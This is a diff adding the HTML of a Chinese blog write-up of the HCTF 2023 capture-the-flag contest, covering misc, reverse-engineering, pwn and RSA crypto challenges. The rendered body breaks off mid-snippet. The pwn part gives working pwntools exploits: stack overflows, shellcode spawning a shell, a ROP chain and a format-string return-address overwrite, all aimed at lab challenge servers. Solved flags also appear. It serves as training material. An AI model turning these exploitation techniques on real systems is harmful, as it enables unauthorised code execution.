@@ -1,0 +1,964 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HCTF 2023 wp | Smera1d0&#39;s Blog</title>
+<meta name="keywords" content="CTF">
+<meta name="description" content="一、Misc
+1.玩原神玩的
+分析：附件为一张图片
+
+观察最后一行，明显有flag的格式
+搜索得知是
+
+对照得flag为：hctf{yuanlainiyewanyuanshenhhh} ">
+<meta name="author" content="Mi Yu">
+<link rel="canonical" href="https://smera1d0.github.io/posts/hctf-2023-wp/">
+<meta name="google-site-verification" content="JEK1eXuLRduZRvpZ01WxuqtEwCBXrfSU3TuSjv3xrTI">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.02238dc96288a65dfaca39b68daacacd93ec4a054c36ef271e4004953dbb23e7.css" integrity="sha256-AiONyWKIpl36yjm2jarKzZPsSgVMNu8nHkAElT27I&#43;c=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://smera1d0.github.io/images/favicon.svg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://smera1d0.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://smera1d0.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://smera1d0.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://smera1d0.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="https://smera1d0.github.io/posts/hctf-2023-wp/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.js" integrity="sha384-Qsn9KnoKISj6dI8g7p1HBlNpVx0I8p1SvlwOldgi3IorMle61nQy4zEahWYtljaz" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          
+          
+          delimiters: [
+              {left: '$$', right: '$$', display: true},
+              {left: '$', right: '$', display: false}
+          ],
+          
+          throwOnError : false
+        });
+    });
+</script><meta property="og:title" content="HCTF 2023 wp" />
+<meta property="og:description" content="一、Misc
+1.玩原神玩的
+分析：附件为一张图片
+
+观察最后一行，明显有flag的格式
+搜索得知是
+
+对照得flag为：hctf{yuanlainiyewanyuanshenhhh} " />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://smera1d0.github.io/posts/hctf-2023-wp/" /><meta property="og:image" content="https://smera1d0.github.io/images/papermod-cover.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-12T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-09-12T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://smera1d0.github.io/images/papermod-cover.png"/>
+
+<meta name="twitter:title" content="HCTF 2023 wp"/>
+<meta name="twitter:description" content="一、Misc
+1.玩原神玩的
+分析：附件为一张图片
+
+观察最后一行，明显有flag的格式
+搜索得知是
+
+对照得flag为：hctf{yuanlainiyewanyuanshenhhh} "/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://smera1d0.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HCTF 2023 wp",
+      "item": "https://smera1d0.github.io/posts/hctf-2023-wp/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HCTF 2023 wp",
+  "name": "HCTF 2023 wp",
+  "description": "一、Misc 1.玩原神玩的 分析：附件为一张图片\n观察最后一行，明显有flag的格式\n搜索得知是\n对照得flag为：hctf{yuanlainiyewanyuanshenhhh} ",
+  "keywords": [
+    "CTF"
+  ],
+  "articleBody": "一、Misc 1.玩原神玩的 分析：附件为一张图片\n观察最后一行，明显有flag的格式\n搜索得知是\n对照得flag为：hctf{yuanlainiyewanyuanshenhhh} 2.signin 附件为一段文本\nWzEwNCwgOTksIDExNiwgMTAyLCAxMjMsIDY2LCA5NywgMTE1LCAxMDEsIDk1LCA3MCwgNjQsIDEwOSwgMTA1LCA0OSwgMTIxLCA5NSwgNTIsIDExNCwgMTAxLCA5NSwgODYsIDk3LCAxMTQsIDEwNSwgNDgsIDExNywgMTE1LCAxMjVd base64解码后得到\n[104, 99, 116, 102, 123, 66, 97, 115, 101, 95, 70, 64, 109, 105, 49, 121, 95, 52, 114, 101, 95, 86, 97, 114, 105, 48, 117, 115, 125] 很明显是ASCII码\n编写py脚本\nascii_list = [104, 99, 116, 102, 123, 66, 97, 115, 101, 95, 70, 64, 109, 105, 49, 121, 95, 52, 114, 101, 95, 86, 97, 114, 105, 48, 117, 115, 125] # 将ASCII码转换为字符 result = ''.join(chr(num) for num in ascii_list) print(result) 得到hctf{Base_F@m1y_4re_Vari0us}\n3.Bomb 先用nc连接，然后多尝试几次发现炸弹的分布比较固定，对照着通关即可拿到flag\n二、Re 1.SDU的第一张考卷 将附件用 IDA pro打开\nmain函数里就有答案，最后一题需要猜，最多猜4次嘛（）\nflag：HCTF{ACCBDAADBB}\n2. XOR 一个简单的异或，告诉了我们enc数组和密钥key，将enc数组中的元素与key逐位异或即可\n写出py脚本：\nenc = [ 16, 115, 38, 25, 3, 67, 109, 114, 23, 21, 103,52, 75, 111, 97, 90, 47, 45, 101, 32, 91, 83, 83,93, 60, 28, 0, 41, 93, 1, 109, 122, 38, 28, 17 ,40, 81, 66, 75, 67, 60, 98] key = 'HCTF2023' flag = '' for i in range(len(enc)): xor_result = enc[i] ^ ord(key[i % len(key)]) flag += chr(xor_result) print(flag) 输出为：X0r_1s_A_V3ry_Sign1ficant_Too1_In_Encrypt!\nflag：HCTF{X0r_1s_A_V3ry_Sign1ficant_Too1_In_Encrypt!}\n3.Maze 放入IDA阅读代码\nflag要进入一个check函数，我们继续阅读check函数\nstrcpy( maze, \"********************U..**************.****..O*****...****.*******.******.*******........********************************\"); count = 0; init_location = 20; while ( count \u003c= 19 ) { v1 = count++; v2 = flag[v1]; if ( v2 == 100 ) { ++init_location; } else if ( v2 \u003e 100 ) { if ( v2 == 115 ) { init_location += 15; } else if ( v2 == 119 ) { init_location -= 15; } } else if ( v2 == 97 ) { --init_location; } } return maze[init_location] == 79; } v2有wasd四种情况，想到上下左右四个方向\na 和 d 分别是位置-1和位置+1\n而 w 和 s 是-15和+15\n如果w s是向上下方向走的，则不难推出迷宫的规格为15×15\n根据给出的字符串画出迷宫\n***************\r*****U..*******\r*******.****..O\r*****...****.**\r*****.******.**\r*****........**\r***************\r*************** 代码里描述了起始位置为U，终点为O，则需要的操作为：\nddssaassdddddddwwwdd\nflag:HCTF{ddssaassdddddddwwwdd}\n三、pwn 1、gift nc连接即可\n2、Fly 先checksec一下\n64位且可以进行栈溢出\n然后我们阅读程序代码\nread函数可以进行栈溢出，但进入if中我们需要找到一个字符使它的ASCII码值为-105\n关于ASCII码为负值的原因可以参考：\nhttps://blog.csdn.net/kelehaier/article/details/59560419\n据此我们可以计算出实际的ASCII码为151\n然后我们查看buf的栈\n起始地址为0xD0\n溢出值为：\noffset = 0xD0+0x08 找到后门函数\n后门函数起始地址为： 构造payload为：\npayload = b'a'*offset+p64(0x40086E) exp:\nfrom pwn import * r = remote(\"10.102.32.142\", 23961) ch = chr(151) offset = 0xD0+0x08 r.sendline(ch) payload = b'a'*offset+p64(0x40086E) r.sendline(payload) r.interactive() 成功拿到shell\n3.sdu_L0g1n 同样先checksec一下\n同样是64位且未开启栈保护\n拖进IDA分析程序\n发现有两次strcmp检测，我们需要绕过strcmp检测\n可以通过后面加\\x00的方法绕过\n找到后门函数：\n观察程序结构，我们可以考虑从main函数通过read的栈溢出溢出到后门函数的位置，这样就可以劫持后门函数获取shell权限\n经过反复调试，exp为\nfrom pwn import * r = remote(\"10.102.32.142\", 26613) offset = 0x40 r.sendline('SDUpwner\\x00') payload = b'N1nEmAN is C.o0O0OOOOL!\\x00'+b'a'*offset +p64(0x4006C6) r.sendline(payload) r.interactive() 4.rdshellcode 打开附件，观察main函数\nint __cdecl main(int argc, const char **argv, const char **envp) { char buf[104]; // [rsp+0h] [rbp-70h] BYREF int v5; // [rsp+68h] [rbp-8h] BYREF int v6; // [rsp+6Ch] [rbp-4h] setvbuf(stdin, 0LL, 0, 0LL); setvbuf(stdout, 0LL, 1, 0LL); setvbuf(stderr, 0LL, 2, 0LL); puts(\"I'm glad that you choose pwn\"); puts(\"But i am n0t sure you really love pwn or not\"); puts(\"Can't you prove yourself?\"); puts(\"Tell me something....\"); srand(0x2023u); v6 = rand() % 2 - 60; __isoc99_scanf(\"%d\", \u0026v5); if ( v6 != v5 ) { puts(\"You DO Not Really Love PWN !\"); exit(1); } puts(\"Nice!!!!, you have proved your love for pwn\"); printf(\"It's time for me: %p\\n\", buf); puts(\"Dot' you want to make friends with me?\"); read(0, buf, 0x100uLL); return 0; } v6实际上是一个伪随机数，一直为-59，我们让v5的值为-59即可 然后程序会输出一个地址 发现地址是随机化的，所以我们要用pwntools里的内置函数读取printf出的buf的地址\nexp如下：\nfrom pwn import * p = remote(\"10.102.32.142\",27714) context(log_level = 'debug', arch = 'amd64', os = 'linux') shellcode=asm(shellcraft.sh()) p.sendline(b'-59') p.recvuntil(b':') buf = p.recvline() print(buf) #shellcode = b'\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05' # shellcode = '\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05' payload = b'A' * (0x70 + 8) + p64(int(buf,16) + 0x70 + 8 + 8) + shellcode p.sendline(payload) p.interactive() buf的栈深度是0x70，64位程序＋8，后面再＋8是shellcode地址的长度，于是我们可以得到如下模板\npayload = b'A' * (栈深度 + 8) + p64(int(栈地址,16) + 0x70 + 8 + 8) + shellcode shellcode我们可以用pwntools生成\ncontext(log_level = 'debug', arch = 'amd64', os = 'linux') shellcode=asm(shellcraft.sh()) 运行exp得到flag\n5.fleshman main函数如下：\nint __cdecl main(int argc, const char **argv, const char **envp) { char s[32]; // [rsp+0h] [rbp-20h] BYREF memset(s, 0, sizeof(s)); init(); puts(\"We1c0me t0 SDU! Since y0u are f1esh here,te11 me s0mething ab0ut Y0u:\"); puts(\"Your name: \"); read(0, s, 0x20uLL); puts(\"Your ID: \"); read(0, s, 0x28uLL); if ( !strcmp(s, \"pwnner\") ) { printf(\"\\nNice t0 mEEt y0u %s\", s); putchar(10); vuln(); } getflag(); return 0; } strcmp绕过＋构造ROP链 用ROPgadget查找出pop rdi的地址\nROPgadget --binary 文件路径 --only \"pop|ret\" | grep rdi\n然后套用rop链的模板 payload = b'a'*offset +p64(pop_rdi)+ p64(binsh)+p64(call_system)\nexp如下：\nfrom pwn import * p = remote(\"10.102.32.142\",31698) p.sendline(b'miyu') p.sendline(b'pwnner\\x00') offset = 0x70 + 8 binsh = 0x402640 call_system=0x401392 pop_rdi = 0x401513 payload = b'a'*offset +p64(pop_rdi)+ p64(binsh)+p64(call_system) p.sendlineafter(b'WhAt can Y0u d0....',payload) p.interactive() 得到flag\n6.rememberornot 观察main函数，发现只要计算100道题的答案即可获得flag 直接上脚本\nfrom pwn import * p = remote(\"10.102.32.142\",38108) p.recvuntil(b':') for i in range(100): p.recvuntil(b':') expression = p.recvline() Expression = expression[:-3] print(Expression) ans = eval(Expression) Ans = str(ans) print(ans) p.sendline(Ans) p.interactive() 利用python内置的eval函数即可进行表达式的运算\nflag:HCTF{Y0U_RE@l1Y_REMEMbER_Y0uR_mA7H968ce06ba4d9}\n7.overflow 本题为最简单的栈溢出 vuln函数\nint vuln() { int result; // eax char v1[76]; // [rsp+0h] [rbp-50h] BYREF int v2; // [rsp+4Ch] [rbp-4h] v2 = 0; result = gets(v1); if ( v2 == 2 ) return system(\"cat flag\"); return result; } 直接对v1进行溢出即可\nexp：\nfrom pwn import * p = remote(\"10.102.32.142\",22019) offset = 0x50+8 system_addr=0x401225 payload = b'a'*offset+p64(system_addr) p.sendline(payload) p.interactive() 8. gift军训版 关键函数如下：\nvoid __cdecl junxun() { char you; // [rsp+6h] [rbp-Ah] BYREF char fesitival; // [rsp+7h] [rbp-9h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); fesitival = -127; puts(\"\\x1B[33mMilitary training? When is the festival\\x1B[0m\"); __isoc99_scanf(\"%c\", \u0026you); printf(\"You believe 0x%hhx is the fesitival?\", (unsigned int)you); if ( fesitival != you ) { puts(\" nononono...\"); exit(1337); } puts(\" yesyesyes!!!\"); system(\"sh\"); } 又是熟悉的ASCII码为负值的情况\n实际的ASCII码为129\nexp：\nfrom pwn import * p = remote(\"10.102.32.142\",47318) payload =chr(129) p.sendline(payload) p.interactive() 9.小明的家庭住址 本题核心点在于格式化字符串的利用\nmain函数：\nnt __cdecl main(int argc, const char **argv, const char **envp) { char buf[48]; // [rsp+0h] [rbp-70h] BYREF char format[56]; // [rsp+30h] [rbp-40h] BYREF unsigned __int64 v6; // [rsp+68h] [rbp-8h] v6 = __readfsqword(0x28u); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); puts(\"\\n\\x1B[33m---------------------------------------------\"); puts(\"----------\\x1B[0m\\x1B[34mWelcome_to_address_SYSTEM\\x1B[0m\\x1B[33m----------\"); puts(\"---------------------------------------------\\x1B[0m\\n\"); puts(\"\\x1B[32;5mWhere is XiaoMing's Home?\\x1B[0m\"); read(0, buf, 0x30uLL); printf(buf); puts(\"\\x1B[32;5mAnd where is XiaoHong's?\\x1B[0m\"); read(0, format, 0x30uLL); printf(format); return 0; } 对于这种printf没有任何限制条件的情况，我们可以利用格式化字符串漏洞\n首先我们利用%p得到ret寄存器的地址\n然后计算偏移\n偏移为13\n然后我们找到后门函数的地址0x40159C=4199836(十进制)\n可以构造%4199836c%14$lln\nexp如下：\nfrom pwn import* p = remote(\"10.102.32.142\", 40682) p.recv() p.send(b'aaaa-%p') p.recvuntil(b'Home?\\x1b[0m\\n') addr = p.recv()[5:19] Addr = int(addr ,16) offset = 0x70+8 ret_addr = Addr+offset payload = b'%4199836c%14$lln'+p64(ret_addr) p.sendline(payload) p.interactive() 四、Crypto 1.caesar 偏移量11\nhctf{obviouslythisiscaesarcipher}\n2.not_caesar 维吉尼亚密码，且没有告诉我们密钥\n一个好用的网站 https://www.guballa.de/vigenere-solver\n通过统计字符出现的频率来爆破出密码（文本足够长）\nhctf{Icanbreakitwithoutkey}\n3.MathⅠ 题目如下：\nfrom Crypto.Util.number import * from secret import prng import os flag = os.environ.get('FLAG', 'HCTF{this_is_a_sample_flag}') #prng 参考2023新课标I卷P20 sys = prng() def constraint(): time = 1000 sample_a = [] sample_b = [] for _ in range(time): out = sys.next() sample_a.append(out[0]) sample_b.append(out[1]) assert all([sample_a[i]-sample_a[i-1] == sys.d for i in range(1, time)]) assert all([sample_b[i-1] == (i**2+i)/sample_a[i-1] for i in range(1, time)]) assert 3*sample_a[1] == 3*sample_a[0]+sample_a[2] return sum(sample_a[:777]+sample_b[:777]) def rsa_plus(m): p = getPrime(512) q = getPrime(512) n = p*q e = 0x10001 m = bytes_to_long(m.encode()) r1 = sys.next()[0] r2 = sys.next()[0] c = pow(pow(pow(m, e, n)*r1, e, n)*r2, e, n) h = 2*p+3*q return n, c, h h1 = constraint() n, c, h2 = rsa_plus(flag) print(f'n = {n}') print(f'c = {c}') print(f'hint1 = {h1}') print(f'hint2 = {h2}') \"\"\" n = 123448414953228974011805323696137868781943298061640108583721204983031140531897314375841622324228108297198646457634512292527604743406056418492269259916712299664727931022315281719439527653756604578385299396113560339992952472500080663133453498156861989739986186852600863076353168997852910108312422507070843691527 c = 70355784775921655880380025465489949573241301926464797611681833071256665441460869302372712558837199110767728290007652944220079907048322612573185968943864339915304868935319658344195708544022979094906385190425552202576200107202487083736800245172584184112275476974513051986233708501062909943346214681580048469716 hint1 = 234850971.0 hint2 = 54673117809069678475594947601860826118221736045735845051744912971409541561632603188516528135267179886112707141940065852170163389165168708306257365103150093 \"\"\" constraint()函数描述了2023新课标I卷P20的题干部分 并且告诉我们h1是$a_n$和$b_n$的前777项和，即 $$ S_{777}+T_{777}=h1 $$ 我们由此可以计算出$a_n$的通项公式为$a_n=777n$ 根据time=1000，我们可以得出$r_1$和$r_2$是数列$a_n$的第1001项和第1002项，即： $$ r_1=777\\times1001\\ r_2=777\\times1002 $$ 然后根据含有$p,q$的两个式子，可以得到一个二元方程组：\n$$ \\begin{cases} pq=n\\ 2p+3*q=hint2 \\end{cases} $$ 其中$n$和$hint2$都是已知的，因此我们可以解出$p$和$q$。\nfrom sympy import symbols, Eq, solve import gmpy2 # 定义未知数 p, q = symbols(\"p q\") # 解方程 expr2 = [2*p+3*q-54673117809069678475594947601860826118221736045735845051744912971409541561632603188516528135267179886112707141940065852170163389165168708306257365103150093, p*q-123448414953228974011805323696137868781943298061640108583721204983031140531897314375841622324228108297198646457634512292527604743406056418492269259916712299664727931022315281719439527653756604578385299396113560339992952472500080663133453498156861989739986186852600863076353168997852910108312422507070843691527] r2 = solve(expr2, [p, q]) print(\"r2:\", r2) 得到：\np = 12384051763953430863668172341605062087552196009776396484360059546294965143403046818805051855772540020996782547927228938821561716941140613694437078638123523 q = 9968338093720938916086200972883567314372448008727684027674931292939870424942169850302141474574033281373047348695202658175679985094295826972461069275634349\n然后我们根据c = pow(pow(pow(m, e, n)*r1, e, n)*r2, e, n) 进行解密\nexp如下：\nimport gmpy2 from Crypto.Util.number import * r1=1001*777 r2=1002*777 p = 12384051763953430863668172341605062087552196009776396484360059546294965143403046818805051855772540020996782547927228938821561716941140613694437078638123523 q = 9968338093720938916086200972883567314372448008727684027674931292939870424942169850302141474574033281373047348695202658175679985094295826972461069275634349 c = 70355784775921655880380025465489949573241301926464797611681833071256665441460869302372712558837199110767728290007652944220079907048322612573185968943864339915304868935319658344195708544022979094906385190425552202576200107202487083736800245172584184112275476974513051986233708501062909943346214681580048469716 e = 0x10001 n = 123448414953228974011805323696137868781943298061640108583721204983031140531897314375841622324228108297198646457634512292527604743406056418492269259916712299664727931022315281719439527653756604578385299396113560339992952472500080663133453498156861989739986186852600863076353168997852910108312422507070843691527 phi = (p - 1) * (q - 1) d = gmpy2.invert(e, phi) m = pow(c, d, n) c1 = m*gmpy2.invert(r2, n) m1 = pow(c1, d, n) c2 = m1*gmpy2.invert(r1, n) m2 = pow(c2, d, n) print(long_to_bytes(m2).decode()) 在共模下做除法我们需要求出r1和r2关于n的逆元$r_1^{-1}$和$r_2^{-1}$\n最终解得flag为：\nHCTF{D0_y0u_900d_4t_m47h?###}\n",
+  "wordCount" : "2985",
+  "inLanguage": "zh",
+  "datePublished": "2023-09-12T00:00:00Z",
+  "dateModified": "2023-09-12T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Mi Yu"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://smera1d0.github.io/posts/hctf-2023-wp/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Smera1d0's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://smera1d0.github.io/images/favicon.svg"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://smera1d0.github.io/" accesskey="h" title="Smera1d0&#39;s Blog (Alt + H)">Smera1d0&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                    <li>
+                        <a href="https://smera1d0.github.io/en/" title="English"
+                            aria-label="English">English</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://smera1d0.github.io/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://smera1d0.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://smera1d0.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://smera1d0.github.io/cv.pdf" title="CV">
+                    <span>CV</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://www.cnblogs.com/smera1d0" title="博客园">
+                    <span>博客园</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://smera1d0.github.io/">主页</a>&nbsp;»&nbsp;<a href="https://smera1d0.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      HCTF 2023 wp
+    </h1>
+    <div class="post-meta"><span title='2023-09-12 00:00:00 +0000 UTC'>九月 12, 2023</span>&nbsp;·&nbsp;6 分钟&nbsp;·&nbsp;Mi Yu&nbsp;|&nbsp;<a href="https://github.com/Smera1d0/Smera1d0.github.io/tree/master" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e4%b8%80misc" aria-label="一、Misc">一、Misc</a><ul>
+                        
+                <li>
+                    <a href="#1%e7%8e%a9%e5%8e%9f%e7%a5%9e%e7%8e%a9%e7%9a%84" aria-label="1.玩原神玩的">1.玩原神玩的</a></li>
+                <li>
+                    <a href="#2signin" aria-label="2.signin">2.signin</a></li>
+                <li>
+                    <a href="#3bomb" aria-label="3.Bomb">3.Bomb</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%ba%8cre" aria-label="二、Re">二、Re</a><ul>
+                        
+                <li>
+                    <a href="#1sdu%e7%9a%84%e7%ac%ac%e4%b8%80%e5%bc%a0%e8%80%83%e5%8d%b7" aria-label="1.SDU的第一张考卷">1.SDU的第一张考卷</a></li>
+                <li>
+                    <a href="#2-xor" aria-label="2. XOR">2. XOR</a></li>
+                <li>
+                    <a href="#3maze" aria-label="3.Maze">3.Maze</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%b8%89pwn" aria-label="三、pwn">三、pwn</a><ul>
+                        
+                <li>
+                    <a href="#1gift" aria-label="1、gift">1、gift</a></li>
+                <li>
+                    <a href="#2fly" aria-label="2、Fly">2、Fly</a></li>
+                <li>
+                    <a href="#3sdu_l0g1n" aria-label="3.sdu_L0g1n">3.sdu_L0g1n</a></li>
+                <li>
+                    <a href="#4rdshellcode" aria-label="4.rdshellcode">4.rdshellcode</a></li>
+                <li>
+                    <a href="#5fleshman" aria-label="5.fleshman">5.fleshman</a></li>
+                <li>
+                    <a href="#6rememberornot" aria-label="6.rememberornot">6.rememberornot</a></li>
+                <li>
+                    <a href="#7overflow" aria-label="7.overflow">7.overflow</a></li>
+                <li>
+                    <a href="#8-gift%e5%86%9b%e8%ae%ad%e7%89%88" aria-label="8. gift军训版">8. gift军训版</a></li>
+                <li>
+                    <a href="#9%e5%b0%8f%e6%98%8e%e7%9a%84%e5%ae%b6%e5%ba%ad%e4%bd%8f%e5%9d%80" aria-label="9.小明的家庭住址">9.小明的家庭住址</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%9b%9bcrypto" aria-label="四、Crypto">四、Crypto</a><ul>
+                        
+                <li>
+                    <a href="#1caesar" aria-label="1.caesar">1.caesar</a></li>
+                <li>
+                    <a href="#2not_caesar" aria-label="2.not_caesar">2.not_caesar</a></li>
+                <li>
+                    <a href="#3math" aria-label="3.MathⅠ">3.MathⅠ</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h3 id="一misc">一、Misc<a hidden class="anchor" aria-hidden="true" href="#一misc">#</a></h3>
+<h4 id="1玩原神玩的">1.玩原神玩的<a hidden class="anchor" aria-hidden="true" href="#1玩原神玩的">#</a></h4>
+<p>分析：附件为一张图片</p>
+<img src="https://s2.loli.net/2023/08/27/mCawcHF5rT1tROf.png" alt="玩原神玩的.png" style="zoom: 33%;" />
+<p>观察最后一行，明显有flag的格式</p>
+<p>搜索得知是</p>
+<img src="https://s2.loli.net/2023/08/26/D4RmacsHCtXhvM9.png" alt="image.png" style="zoom: 67%;" />
+<p>对照得flag为：<code>hctf{yuanlainiyewanyuanshenhhh} </code></p>
+<h4 id="2signin">2.signin<a hidden class="anchor" aria-hidden="true" href="#2signin">#</a></h4>
+<p>附件为一段文本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">WzEwNCwgOTksIDExNiwgMTAyLCAxMjMsIDY2LCA5NywgMTE1LCAxMDEsIDk1LCA3MCwgNjQsIDEwOSwgMTA1LCA0OSwgMTIxLCA5NSwgNTIsIDExNCwgMTAxLCA5NSwgODYsIDk3LCAxMTQsIDEwNSwgNDgsIDExNywgMTE1LCAxMjVd
+</span></span></code></pre></div><p>base64解码后得到</p>
+<pre tabindex="0"><code>[104, 99, 116, 102, 123, 66, 97, 115, 101, 95, 70, 64, 109, 105, 49, 121, 95, 52, 114, 101, 95, 86, 97, 114, 105, 48, 117, 115, 125]
+</code></pre><p>很明显是ASCII码</p>
+<p>编写py脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ascii_list</span> <span class="o">=</span> <span class="p">[</span><span class="mi">104</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span 